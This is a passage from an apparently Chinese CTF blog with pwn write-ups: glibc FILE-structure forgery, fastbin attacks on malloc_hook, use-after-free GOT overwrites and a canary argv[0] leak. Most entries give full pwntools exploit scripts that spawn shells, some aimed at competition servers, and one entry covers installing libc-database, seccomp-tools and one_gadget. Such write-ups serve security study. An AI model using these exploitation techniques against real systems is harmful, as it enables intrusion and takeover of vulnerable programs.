choice:\n",'5')advice()advice_msg(6064)advice_edit(p64(0xdeadbeef)*5+p64(one_gadget))p.sendlineafter("4.return\n",'4')meyer()remove()leave_msg(p64(0xffffffff))p.sendlineafter("Pls Input your choice:\n",'5')advice()advice_dele()p.interactive() pwnble.tw–seethefile则是通过覆盖掉FP指针，使其指向可控的位置，伪造vtable修改fclose函数地址。 fclose先调用unlink将FILE结构解链，但由于这个FP并不在链中，并没有解下来，但也没继续追究；然后调用_IO_file_close_it将文件关闭，接着调用_IO_FINISH。修改_IO_FINISH为system，并且FP地址前几个字节写入sh，即可获取shell。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context.log_level='debug'debug = 1if debug: p= process('./seethefile') libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10200) libc = ELF('./libc_32.so.6')d = 1def openfile(filename): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('What do you want to see :') p.sendline(filename)def readfile(): p.recvuntil('Your choice :') p.sendline('2')def writefile(): p.recvuntil('Your choice :') p.sendline('3')def closefile(): p.recvuntil('Your choice :') p.sendline('4')def leave(name): p.recvuntil('Your choice :') p.sendline('5') p.sendline(name)#read base addr of libc and seethefileopenfile('/proc/self/maps')readfile()writefile()elf_base = int(p.recv(8),16)readfile()writefile()#p.recvuntil('0 rw-p 00000000 00:00 0 \n')p.recvline()if debug: p.recvline()#for local,delete for romotelibc_base = int(p.recv(8),16)libc.address = libc_basesys_addr = libc.symbols['system']log.info('sys_addr:%#x',sys_addr)print 'elf_base:%x,libc_base: %x' %(elf_base,libc_base)#shellcode = asm('push 0x68732f\n push 0x6e69622f\nmov ebx, esp\nxor ecx,ecx\nxor edx,edx\nmov al,0xb\nint 0x80')fp = elf_base + 0x3284file_struct = 'sh\0\0'+'\x00'*4+'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x2e\x6f\xf7\x00\x00\x00\x02\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00'file_struct += '\xc4'+p32(libc_base-0x200)+'\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x80\x24\x6f\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf7'file_struct += p32(fp+0x94)payload = 'a' *32 + p32(fp) +file_struct +p32(0xdeadbeef)*16+ p32(sys_addr)if d: gdb.attach(p,"b *0x8048ae0")leave(payload)p.interactive()#'\xff\x30\xad\xfb' FSOP参考2018suctf-note _IO_buf_ptr以echo为例。本题有一个明显的格式化字符串漏洞（但我并没看出来），能够泄露libc地址、栈地址，也能写内存。向stdin的_IO_buf_ptr中写入\x00，使_IO_buf_base指向_IO_write_base。 这里要介绍一下这几个指针。当fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end时，会向_IO_read_ptr中缓存输入，并执行_IO_read_ptr++；当fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end时，输入的内容就会缓存到_IO_buf_base，且读入的字节数是count = _IO_buf_end-_IO_buf_base，并且_IO_read_end会向后挪动count个字节。 123456789101112131415161718192021222324252627282930313233343536373839404142if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) return *(unsigned char *) fp-&gt;_IO_read_ptr; if (fp-&gt;_IO_buf_base == NULL) &#123; /* Maybe we already have a push back pointer. */ if (fp-&gt;_IO_save_base != NULL) &#123; free (fp-&gt;_IO_save_base); fp-&gt;_flags &amp;= ~_IO_IN_BACKUP; &#125; _IO_doallocbuf (fp); &#125; …… fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base; fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base; fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base; // read(0, _IO_buf_base, count) count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base); if (count &lt;= 0) &#123; if (count == 0) fp-&gt;_flags |= _IO_EOF_SEEN; else fp-&gt;_flags |= _IO_ERR_SEEN, count = 0; &#125; // read_end加上这次读所读到的字节数 fp-&gt;_IO_read_end += count; if (count == 0) &#123; /* If a stream is read to EOF, the calling application may switch active handles. As a result, our offset cache would no longer be valid, so unset it. */ fp-&gt;_offset = _IO_pos_BAD; return EOF; &#125; if (fp-&gt;_offset != _IO_pos_BAD) _IO_pos_adjust (fp-&gt;_offset, count); return *(unsigned char *) fp-&gt;_IO_read_ptr;&#125; 当_IO_buf_base指向_IO_write_base时，_IO_read_ptr == _IO_read_end（在scanf和getchar的配合之下，每次都能使_IO_read_ptr == _IO_read_end），在scanf时就会执行read(0, _IO_buf_base, count)，再次对FILE结构中的指针进行覆写，此时可以将_IO_buf_base覆写为栈中返回地址的位置。 为了能够继续覆写返回地址，继续利用scanf，但要先消耗掉_IO_read_ptr。原因在于，刚才的操作count为0x64，_IO_read_end += count，将_IO_read_end向后挪动了0x64个字节，下一个getchar，_IO_read_ptr++，此时_IO_read_ptr和_IO_read_end相差了0x63字节。消耗掉这0x63字节后，才会继续向_IO_buf_base写入。 利用脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *context.log_level='debug'p = process('./echo')libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')gadget =[0x45216,0x4526a,0xf02a4,0xf1147]def set_name(name): p.sendlineafter("choice&gt;&gt; ","1") p.sendlineafter("name:",name)def echo(l,content): p.sendlineafter("choice&gt;&gt; ","2") p.sendlineafter("length:",str(l)) p.sendline(content)echo(-1,"%3$p")p.recvuntil(" say:")libc_addr = int(p.recv(14),16)-0xf72c0log.info("libc_addr:%#x",libc_addr)echo(-1,"%12$p")p.recvuntil(" say:")ebp_addr = int(p.recv(14),16)-0x30log.info("ebp_addr:%#x",ebp_addr)#gdb.attach(p)set_name(p64(libc_addr+0x3c48e0+0x38))#stdin-&gt;io_buf_ptrecho(-1,"%16$hhn")#write 0 to io_but_ptr's last byte,now io_buf_ptr-&gt;io_write_basepayload= p64(libc_addr+0x3c48e0+0x20+0x63)*3 #three io_write_*payload +=p64(ebp_addr+8)#io_buf_ptrpayload +=p64(ebp_addr+8+12)#io_buf_endpayload +=p64(0)*6payload +=p64(0xffffffffffffffff)payload +=p64(0)echo(payload,'flow')for i in range(0,0x63): echo(1,'1')echo(p64(libc_addr+gadget[0]),'attack')p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dc010]]></title>
    <url>%2F2018%2F09%2F10%2Fdc010%2F</url>
    <content type="text"><![CDATA[在现场打比赛紧张得不行ORZ。 基本逻辑 add函数从ptr[0]和ptr[1]中找到一个空闲块，分配一个大小为size的块，用于存放信息。可见本题只有ptr数组中只有两个元素可用。 show函数输出信息。 dele函数很神奇，如果对应的dele_flag为1，代表已经删除过了，直接将指针置零；为1代表还未删除，调用free函数，并把dele_flag置一。这种方法能够防止double free，而且所有指针都只能free一次，之后的就只是把ptr置零。 一些知识 正常情况下，fastbin的inuse位为1，即使在释放时候也不会置零。其他类型的块都会把inuse位置零。 但是当其他类型的块释放并合并时，合并大小大于64KB时，会调用malloc_consolidate合并fastbin中的chunk到unsorted bin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; if (have_fastchunks(av)) malloc_consolidate(av); …… &#125;static void malloc_consolidate(mstate av)&#123; …… do &#123; check_inuse_chunk(av, p); //nextp为FD指向的块 nextp = p-&gt;fd; /* Slightly streamlined version of consolidation code in free() */ size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA); //nextchunk为地址上相邻的下一块 nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); //如果前一块空闲，合并 if (!prev_inuse(p)) &#123; prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); &#125; //如果下一块不是top，当下一块空闲时，合并；不空闲则把本块的inuse置零 if (nextchunk != av-&gt;top) &#123; nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; size += nextsize; unlink(av, nextchunk, bck, fwd); &#125; else clear_inuse_bit_at_offset(nextchunk, 0); …… //放入unsorted bin first_unsorted = unsorted_bin-&gt;fd; unsorted_bin-&gt;fd = p; first_unsorted-&gt;bk = p; …… set_head(p, size | PREV_INUSE); p-&gt;bk = unsorted_bin; p-&gt;fd = first_unsorted; set_foot(p, size); &#125; //下一块为top，与top合并 else &#123; size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; &#125; &#125; while ( (p = nextp) != 0); ……&#125; 另外，在_int_malloc中也有对fastbins的合并：当申请的大小在smallbin范围内，但smallbin中还没有初始化，先对fastbins进行合并，放入unsortedbin（还不知道如何在应用层触发这个条件）；或者是申请的大小在largebin范围内，判断fastbins中是否有chunk，存在则对fastbins合并。 12345678910111213141516171819if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) &#123; if (victim == 0) /* initialization check */ malloc_consolidate (av); else …… &#125; &#125;else &#123; idx = largebin_index (nb); if (have_fastchunks (av)) malloc_consolidate (av); &#125; （与本题关系不大）当不能直接触发malloc函数时，可以通过double free触发malloc_printerr进而触发malloc函数，函数调用顺序如下： ​ 另，在unsorted bin非空的情况下，malloc时会沿着unsorted bin寻找合适的块，如果能修改某块的BK指针，使之指向一个不是chunk的地址，同样会触发malloc_printerr，如下面这段代码： 12345678910111213141516int main()&#123; char *a = malloc(0x100); char *b = malloc(0x60); char c[8]; int i; free(a); for(i=0;i&lt;6;i++)&#123; c[i]=a[i]; &#125; c[0]='\x30'; //修改BK指针最后一位为 0x30 strncpy(a+8,c,6); malloc(0x110);&#125; 漏洞分析当第一次调用dele函数时，会使用free，而且不对ptr置零。此时调用show函数则会泄露出FD，即main_arena+88，进而泄露libc地址。 此外，add函数中向ptr[i]中输入info时，没有限制大小，会造成堆溢出。 漏洞利用泄露libc地址ptr[0]要求一个size为0x100的块，即指向大小为0x110的块，ptr[1]要求一个size为0x60的块，即指向大小为0x70的块。第一次dele *ptr[0]，0x110块会放置在unsorted bin 中，FD指针指向main_arena+88，由此泄露libc地址。 覆写malloc_hook释放*ptr[0]之后释放*ptr[1]，由于*ptr[1]是一个fastbin，释放之后不会与top合并。释放两块并置零后，再次申请0x100大小的块，并向其中填充数据，溢出覆盖掉已释放的*ptr[1]中的FD指针，使它指向malloc_hook-35的位置，之所以选择这里是因为如果把这个地址看作一个chunk，size字段恰好为0x7f。达到的效果和fastbin attack一样，再次申请0x60大小的块时就会将malloc_hook-35分配出去，实现向malloc_hook中写入内容。 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *context.log_level='debug'gadget =[0x45216,0x4526a,0xf02a4,0xf1147]debug = 1if debug: p = process('./clear_note') #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote('39.107.67.157', 9999)def add(info,size): p.sendlineafter("choice&gt;&gt; ",'1') p.sendlineafter("size: ",str(size)) p.sendlineafter("info: ",info)def show(idx): p.sendlineafter("choice&gt;&gt; ",'2') p.sendlineafter("index: ",str(idx))def dele(idx): p.sendlineafter("choice&gt;&gt; ",'3') p.sendlineafter("index: ",str(idx))add("0gur1",0x100)#0add("0gur2",0x60)#1dele(1)dele(0)show(0)p.recvuntil("info: ")addr = u64(p.recvline()[:-1].ljust(8,'\x00'))log.info('addr:%#x',addr)libc_base = addr - 3951480malloc_hook = libc_base + 3951376log.info('malloc_hook:%#x',malloc_hook)dele(1)dele(0)add('a'*0x100+p64(0xdeadbeef)+p64(0x71)+p64(malloc_hook-35),0x100)dele(0)add("0gur2",0x60)add('a'*19+p64(libc_base+gadget[3]),0x60)#gdb.attach(p)dele(0)p.sendlineafter("choice&gt;&gt; ",'1')p.sendlineafter("size: ",str(0x60))p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018网鼎杯线下半决赛pwn]]></title>
    <url>%2F2018%2F09%2F09%2F2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%BA%BF%E4%B8%8B%E5%8D%8A%E5%86%B3%E8%B5%9Bpwn%2F</url>
    <content type="text"><![CDATA[pwn1本题的逻辑和线上的EasyCoin还是很像的，但是有些蜜汁逻辑真的看着难受。 基本逻辑 regist函数在ptr数组中找到一个空闲的位置，ptr中每个地址都是一个0x130大小的块，注册后的结构如下： 12345678struct user&#123; char *name; int age; char des[256]; char *msg_list; struct user *next; bool inuse;&#125; login函数简单粗暴的查找username，然后登入。 view_profile打印出用户名、年龄和描述信息。 update更新用户名、年龄和描述信息，非常坑的是，更新用户名时只能再输入strlen(username)长度的字符。 friend函数可以删除或者添加一个friend。删除时，沿着next找到要删除的user。添加时，沿着next找到最后一个结点并添加。忍住不吐槽这个破函数……忍住……. 这里可以添加自己为friend send函数发送msg，每次send之前要构造一个msg结构体,msg的结构体如下： 12345struct msg&#123; char *title; char *content; struct msg *next;&#125; 这里用到的strdup函数相当于： 12p = malloc(strlen(buf));strcpy(p,buf); view_msg和logout比较简单，这里就不列出了。 漏洞分析和EasyCoin一样，本题也可以添加自己为好友，next指针指向自己，删除好友时，相当于释放自己这块内存。而释放后没有将指针置零，UAF漏洞能够泄露地址和覆写got表。 漏洞利用泄露libc地址释放一个user后，它的name字段被覆写为FD，该指针指向main_arena+88。 覆写got表当重新注册一个新用户时，首先在ptr数组中找一个闲置的块，然后按照输入的size，malloc一个块作为name的空间。由于刚刚释放了一个user，unsorted bin中已有一个大小为0x130的块。当输入的size小于0x130时，就会从unsorted bin上分配给name。 此时在name中写入puts@got的地址，即相当覆写已释放的user的name地址为puts@got地址，此时我们再update已释放user，就能向puts@got写入one_gadget地址了。 艰苦的心路历程虽然本题利用很简单，但是！！我踩了好多坑！！ 思路一：把已释放user的name字段覆写为malloc_hook的地址，再update，试图向malloc_hook中写入one_gadget。然而！update时用到了strlen！而strlen(&amp;__malloc_hook)的值为0，也就是根本写不进去 思路二：泄露libc也可以通过environ变量泄露栈地址，覆写函数返回地址为one_gadget。再一次被update阻拦了，栈中的返回地址长度都为3（如0x400ebe）。又想是否能够修改main函数的返回地址？发现main函数是通过exit退出的，没有leave;ret环节。 思路三：向FD所指的main_arena+88中写入got表地址，由于main_arena+88恰好是记录top地址的位置，覆写成got表，之后的malloc会从got表中分配并可以覆写got表。然而，update还必须要输入age，age处对应了BK指针，为了保证能够正常分配块，age也应该保持main_arena+88，但是update对age进行了截断，只复制后四字节然后自行填充，就不能把完整的地址写入BK处。 利用脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *context.log_level = 'debug'p = process('./pwn1')gadget=[0x45216,0x4526a,0xf02a4,0xf1147]puts_got = 0x602020def login(name): p.sendlineafter("Your choice:",'1') p.sendlineafter("Please input your user name:",name)def regist(name,size,age,des): p.sendlineafter("Your choice:",'2') p.sendlineafter("Input your name size:",str(size)) p.sendlineafter("Input your name:",name) p.sendlineafter("Input your age:",str(age)) p.sendlineafter("Input your description:",des)def view_info(): p.sendlineafter("Your choice:",'1')def update(name,age,des): p.sendlineafter("Your choice:",'2') p.sendafter("Input your name:",name) p.sendlineafter("Input your age:",str(age)) p.sendlineafter("Input your description:",des)def add_friend(name): p.sendlineafter("Your choice:",'3') p.sendlineafter("Input the friend's name:",name) p.sendlineafter("So..Do u want to add or delete this friend?(a/d)",'a')def dele_friend(name): p.sendlineafter("Your choice:",'3') p.sendlineafter("Input the friend's name:",name) p.sendlineafter("So..Do u want to add or delete this friend?(a/d)",'d')def send(name,title,content): p.sendlineafter("Your choice:",'4') p.sendlineafter("Which user do you want to send a msg to:",name) p.sendlineafter("Input your message title:",title) p.sendlineafter("Input your content:",content)def logout(): p.sendlineafter("Your choice:",'6')regist("0gur11",8,22,"0gur111")regist("0gur22",64,22,"0gur222")login("0gur22")add_friend("0gur22")dele_friend("0gur22")view_info()p.recvuntil("Username:")#leak libcheap = p.recvline()[:-1]heap_len = len(heap)heap_addr = u64(heap.ljust(8,'\x00'))p.recvuntil("Age:")addr = int(p.recvline()[:-1],16)libc_base = addr - 3951480puts_addr = libc_base + 456336log.info('libc_base:%#x',libc_base)log.info('heap_addr:%#x',heap_addr)logout()#rewrite gotregist(p64(puts_got),0x20,22,"0gur333")login(p64(puts_addr))update(p64(libc_base+gadget[0])[:-2],23,"0gur222")p.interactive() pwn2pwn2还是挺简单的，存在数组越界漏洞，而且该数组还是在bss段上，因此可以泄露stderr的地址进而泄露libc地址；另外bss离got也很近，可以覆写got表。 附上脚本 1234567891011121314151617181920212223242526272829303132from pwn import *context.log_level='debug'debug = 1if debug: p = process('./pwn2') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')exit_got = 0x602060gadget =[0x45216,0x4526a,0xf02a4,0xf1147]gdb.attach(p,'b *0x4009a9')payload = 0x19 *'&lt;'+ '+.'+'&lt;+.'*7 + 0x40*'&lt;'+','+'&gt;,'*7p.recvuntil("Put the code: ")p.sendline(payload)stderr_addr = 0#leak libcfor i in range(0,8): c = ord(p.recv(1))-1 stderr_addr += c &lt;&lt; (7-i)*8log.info("stderr:%#x",stderr_addr)libc_base = stderr_addr - 3953984one_gadget = libc_base + gadget[0]#sys_addr = stderr_addr - 3670896log.info("one_gadget:%#x",one_gadget)for i in range(0,8): p.send(p64(one_gadget)[i])p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工具安装及使用]]></title>
    <url>%2F2018%2F08%2F30%2F%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[libc-database下载&amp;安装下载libc-database 1git clone https://github.com/niklasb/libc-database.git 下载各种版本的libc，存放在db目录下 12cd libc-database./get 使用12./find printf 670 puts ca0ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu10_i386) 这里670是要查询的libc中printf地址的后三位（十六进制），同理ca0是puts函数地址的后三位。 seccomp-tools安装1gem install seccomp-tools 使用目前只用到dump，查看沙箱保护允许使用的操作： 123456789101112131415161718$ seccomp-tools dump ./rswc line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x20 0x00 0x00 0x00000000 A = sys_number 0004: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x06 0x00 0x00 0x00000000 return KILL 其他具体使用方法参考撰写工具的大佬：https://github.com/david942j/seccomp-tools one_gadget安装 安装ruby环境和管理工具 12sudo apt-get install rubysudo apt-get install gem 安装one_gadget 1sudo gem install one_gadget 使用直接使用”one_gadget 目标文件”在目标文件里查找system(“/bin/sh”)。找到之后对以下gadget偏移一一进行尝试。 12345678910111213141516$ one_gadget /lib/x86_64-linux-gnu/libc.so.60x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL]]></content>
  </entry>
  <entry>
    <title><![CDATA[2018网鼎杯第一场部分pwn]]></title>
    <url>%2F2018%2F08%2F30%2F2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA%E9%83%A8%E5%88%86pwn%2F</url>
    <content type="text"><![CDATA[好久没做题，手已经生了，这次比赛提醒自己不能懈怠= = Guess基本逻辑程序逻辑比较简单，每次比对flag时fork一个新的子进程进行比较。 再给自己讲一次fork函数：系统会先给新的子进程分配资源，然后从父进程中将各个数据复制到新的进程中。虽然在gdb中调试查看父进程和子进程的同一个变量是在同一个地址，但是实际上的物理地址是不同的，它们的资源是独立的，操作父进程中的变量不会影响子进程，如题目中的v7。fork之后，对于子进程会返回0，对于父进程返回的是子进程的PID，因此在上述逻辑中，对于父进程，会执行v7++，并停等在wait处，直到子进程返回；对于子进程，break跳出循环后进行比对，比对结束后子进程退出。 漏洞分析程序中使用了gets函数，典型的缓冲区溢出函数。但是checksec，程序开启了canary保护： 在ctf-wiki中提到，当canary的值被修改后，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，一般情况下都是程序名。 123456789101112131415161718// debug/stack_chk_fail.cvoid__attribute__ ((noreturn))__stack_chk_fail (void)&#123; __fortify_fail ("stack smashing detected");&#125;// debug/fortify_fail.cvoid__attribute__ ((noreturn)) internal_function__fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "&lt;unknown&gt;");&#125; 尝试输入超过0x40个字节，并在__fortify_fail处设置断点，查看__libc_message的参数： 此时argv[0]中的字符串为程序名，继续执行，就会打印结果： 因此，当我们能够覆盖argv[0]为存放flag的buf地址，就能通过canary机制将内容读出。而且每次canary被修改之后，只是子进程退出，而父进程仍在正常执行。 漏洞利用漏洞利用的思路为将argv[0]的地址覆盖为buf地址。由于buf为栈上的地址，因此首先需要泄露栈地址。在libc中有一个environ变量，它记录了程序的环境变量，而环境变量是存放在栈上的，可以通过读取这个值泄露栈上的地址。但在此之前，需要泄露libc的地址。 泄露libc地址将argv[0]覆写为puts@got的地址泄露puts函数地址。 查看执行gets前后的栈结构，发现有一个变量用于存放argv[0]： 计算S2和这个地址之间的偏移并填充，即可覆盖这一地址中的内容为puts@got的地址，canary保护就会输出puts函数的地址。 本题没有给出libc，可以使用libc-database来确定使用的是哪一版本的libc。 确定后通过相对偏移计算出environ变量的地址。 泄露栈地址在第二次覆写时，将0x7fffffffdf68处覆写为environ的地址，读出栈地址，通过偏移计算出buf地址。 读取flag第三次覆写时，将0x7fffffffdf68处覆写为buf地址，读出flag 利用脚本123456789101112131415161718192021222324252627282930313233from pwn import *context.log_level = 'debug'debug = 0if debug: p = process('./GUESS') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote('106.75.90.160',9999) libc = ELF('./libc-database/db/libc6_2.23-0ubuntu10_amd64.so')puts_got = 0x602020payload = 'a'*296 + p64(puts_got)p.sendlineafter("Please type your guessing flag\n",payload)p.recvuntil("*** stack smashing detected ***: ")puts_addr = u64(p.recv(6).ljust(8,'\0'))log.info("puts_addr:%#x",puts_addr)#gdb.attach(p,'b *0x400b23')environ_addr = puts_addr - (libc.symbols['puts']-libc.symbols['environ'])payload = 'a'*296 + p64(environ_addr)p.sendlineafter("Please type your guessing flag\n",payload)p.recvuntil("*** stack smashing detected ***: ")environ = u64(p.recv(6).ljust(8,'\0'))log.info("environ:%#x",environ)offset = 248rbp = environ - offsetbuf_addr = rbp-0x70payload = 'a'*296 + p64(buf_addr)p.sendlineafter("Please type your guessing flag\n",payload)p.interactive() blind顾名思义，blind的含义就是看不见输出，之前也遇到过同样类型的silent（强网杯），但是本题开了更多的保护机制。 基本逻辑程序主要有三个功能：add、change和release add用于添加一个0x68大小的块，向其中写入内容，同时更新ptr数组。ptr数组存放各个块的地址。 change修改块中的内容。 release释放指定的块，并更新free_time，此处限制了release函数使用的次数。 另外在add和change都用到了一个read_str函数，当遇到\n或输入长度达到限制时，会向当前位置写入一个0 漏洞分析在release函数中free后的指针没有置零，存在UAF漏洞。同时本程序还开启了RELRO保护，不能对GOT表进行修改。 可以通过UAF漏洞构造出fastbin attack一样的条件，即修改已释放的fastbin的FD指针指向一个伪造的块，当再次分配时，伪造的块就被分配出去。 本程序中bss段是可写的，且已经提供现成的system(‘/bin/sh’)，考虑将malloc_hook修改为system函数地址。而malloc_hook离main_arena很近，考虑在ptr数组中伪造一个指针指向main_arena。我们知道，当有一个0x100大小的块被释放时，会被放入unsortedbin，此时FD和BK都会被写成main_arena+88，如果能够伪造一个0x100的块并释放，就能够实现在ptr数组中写入main_arena+88。 漏洞利用为了能向malloc_hook中写入system，需要在ptr数组中伪造一个指向0x100大小块的指针，也就是要实现覆写功能。利用UAF能够修改已释放块的FD指针，让FD指向bss段上stderr-3前后的位置，这里能够保证size处正好对应0x7f，能够绕过free函数的检查。这一块分配出去后，能够向bss段写入0x68个字节，覆盖掉ptr中的内容，顺便覆盖掉free_time。 覆写的时候，从ptr[0]开始伪造fake_chunk，ptr[1]处写入块的大小0x101，ptr[4]位置写入ptr[2]，即ptr[4]控制的块指向ptr[2]处。 覆写完成后，考虑释放掉ptr[4]，但此处需要注意free函数有一些检查（我踩的坑）： __int_free会在释放之前会首先检查释放的chunk是否是16对齐的:misaligend_chunk(p)，不是的话会报错。如果是释放ptr[1]、ptr[3]……这类结尾是0x8的地址就会报错。 12345678static void_int_free (mstate av, mchunkptr p, int have_lock)&#123; ……if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) ……&#125; 考虑到合并的问题，__int_free也会检查释放块是否使用中（即下一块的inuse位是否为1）、释放块的前一块是否使用中（即当前块的inuse是否为1）、释放块的下一块是否在使用中（下一块的下一块 inuse是否为1）。此题为了避免合并，将代表size的ptr[3]末尾置1，并伪造下一块的下一块inuse为1，同时为了确定不是double free，将下一块的inuse位末尾置一。 考虑到上述因素，需要在fake_chunk之后的0x100出写下inuse位1，代表fake_chunk正在使用,同时设置该块大小为0x20；在fake_chunk+0x100+0x20处写下inuse位1，代表fake_chunk的下一块正在使用，不会合并。因此在ptr[3]中写入ptr+0x100的地址，ptr[5]中写入ptr+0x120的地址。 一切准备就绪后，可以释放ptr[4]，ptr[2]处就会写入FD值，即main_arena+88。由于read_str函数在收到\n时会写入一个0，可以change第4块，只输入一个\n，那么ptr[2]中就由main_arena+88(0x7ffff7dd1b70)变成0x7ffff7dd1b00，这个地址正好就是malloc_hook-0x10，此时再change第四块，就能向malloc_hook写入system了。 填充的bss如下： 释放ptr[4]后的bss如下： 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *context.log_level = 'debug'debug = 1if debug: p = process('./blind')else: p = remote('106.75.20.44',9999)bss_addr = 0x60203dptr_addr = 0x602060sys_addr = 0x4008e3fini_addr = 0x601db8def add(idx,content): p.sendlineafter("Choice:",'1') p.sendlineafter("Index:",str(idx)) p.sendlineafter("Content:",content)def change(idx,content): p.sendlineafter("Choice:",'2') p.sendlineafter("Index:",str(idx)) p.sendlineafter("Content:",content)def release(idx): p.sendlineafter("Choice:",'3') p.sendlineafter("Index:",str(idx))add(0,'0gur1')add(1,'1gur1')release(0)release(1)change(0,p64(bss_addr))add(2,'2gur1')#2-&gt;1add(3,'3gur1')#3-&gt;0fake_chunk = p64(0xdeadbeef)+p64(0x101)fake_chunk += p64(0)+p64(ptr_addr+0x100)payload = 'a'*(ptr_addr-bss_addr-16)+fake_chunk+p64(ptr_addr+0x10)+p64(ptr_addr+0x120)add(4,payload)#4-&gt;bss_addrchange(3,p64(0xdeadbeef)+p64(0x21))change(5,p64(0xdeadbeef)+p64(0x21))#gdb.attach(p,'b *0x400c94')release(4)change(4,'')#raw_input()change(2,'a'*0x10+p64(sys_addr))change(4,p64(0))p.sendlineafter("Choice:",'1')p.sendlineafter("Index:",'2')p.interactive() babyheapbabyheap和blind两道题很像，限制条件不同。 基本逻辑babyheap和blind的逻辑类似，不同的是babyheap添加了输出函数show，限制了change的次数，解除了release的次数限制，同时给content分配的块大小由0x68变成了0x20，ptr数组中的块数增加到了10块。 漏洞分析同样，babyheap中的release函数也没有对free掉的指针置零，存在UAF漏洞和double free漏洞。本题没有给system函数，先对libc进行泄露，再覆写free_hook为system。 libc的泄露和free_hook的改写都要需要对ptr数组进行修改，然后通过show和change函数完成泄露和改写。如何能对ptr数组改写呢？由于本题的块大小已被修改为0x20，即chunk size处为0x30，已不能使用blind中的方法。为了能对ptr进行覆写，可以伪造一个chunk，构造FD和BK，通过free触发unlink实现。 漏洞利用unlink实现ptr数组的覆写当要free一个0x90的块时，如果它的前一块是一个空闲块时，会先对前一块进行unlink，然后再把这两块合并。因此，我们需要一个chunk size为0x90且inuse位已经置零的chunk，以及空闲的上一块。 实际上，题目中是存在堆溢出漏洞的，可以利用这个漏洞修改某个块的chunk 